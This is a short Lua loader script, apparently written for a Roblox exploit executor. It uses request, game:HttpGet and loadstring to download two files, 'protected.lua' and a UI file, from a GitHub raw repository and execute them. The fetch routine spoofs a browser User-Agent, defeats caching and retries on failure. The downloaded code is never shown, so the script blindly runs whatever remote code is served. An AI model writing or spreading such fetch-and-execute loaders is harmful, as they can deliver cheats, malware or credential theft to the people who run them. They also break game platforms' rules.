local function fetch(url)
    local bust = "?nocache=" .. tostring(math.floor(tick() * 1000))
    if string.find(url, "?") then
        bust = "&nocache=" .. tostring(math.floor(tick() * 1000))
    end
    url = url .. bust

    for _ = 1, 3 do
        if typeof(request) == "function" then
            local ok, res = pcall(function()
                return request({
                    Url = url,
                    Method = "GET",
                    Headers = { ["User-Agent"] = "Mozilla/5.0" }
                })
            end)
            if ok and res and res.StatusCode == 200 and type(res.Body) == "string" and #res.Body > 0 then
                return res.Body
            end
        end

        for _, cache in ipairs({false, true}) do
            local ok, content = pcall(function()
                return game:HttpGet(url, cache)
            end)
            if ok and type(content) == "string" and #content > 0 then
                return content
            end
        end

        task.wait(0.5)
    end

    return nil
end

local function loadUrl(url)
    local content = fetch(url)
    if not content then
        warn("[loader] failed to fetch required script")
        return
    end

    if content:sub(1, 3) == "\239\187\191" then
        content = content:sub(4)
    end

    local chunk, loadErr = loadstring(content)
    if not chunk then
        warn("[loader] invalid script received")
        return
    end

    local ok, runErr = pcall(chunk)
    if not ok then
        warn("[loader] runtime error: " .. tostring(runErr))
    end
end

local PROTECTED_URL = "https://raw.githubusercontent.com/dsfvxcvb/evolution/main/protected.lua"
local UI_URL        = "https://raw.githubusercontent.com/dsfvxcvb/evolution/main/use_kimi.txt"

loadUrl(PROTECTED_URL)
loadUrl(UI_URL)
